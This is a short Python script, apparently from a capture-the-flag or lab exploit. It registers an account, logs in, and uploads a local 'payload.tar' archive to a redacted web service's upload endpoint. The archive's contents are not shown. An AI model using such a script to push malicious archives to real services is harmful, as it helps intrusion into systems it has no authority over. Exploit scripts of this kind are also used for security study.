import requests

USERNAME = "normal"
PASSWORD = "normal"
ARCHIVE_PATH = "payload.tar"
BASE_URL = "REDACTED"

def main():
    session = requests.Session()
    create_account(session)
    assert(login(session))
    assert(upload(session))

def create_account(session: requests.Session):
    resp = session.post(f"{BASE_URL}/register", data={"username": USERNAME, "password": PASSWORD})
    if resp.status_code == 200:
        print(f"[+] Created account {USERNAME}:{PASSWORD}")
        return True
    else:
        print(f"[-] Failed to create account {USERNAME}:{PASSWORD}")
        return False

def login(session: requests.Session):
    resp = session.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})
    if resp.status_code == 200:
        print(f"[+] Logged in as {USERNAME}:{PASSWORD}")
        return True
    else:
        print(f"[-] Failed to log in as {USERNAME}:{PASSWORD}")
        return False
    
def upload(session: requests.Session):
    files = {'archive': open(ARCHIVE_PATH, 'rb')}
    resp = session.post(f"{BASE_URL}/user/upload",files=files)
    if resp.ok:
        print(f"[+] Uploaded Successfully")
        return True
    else:
        print(f"[-] Failed to upload")
        return False
    
if __name__ == "__main__":
    main()

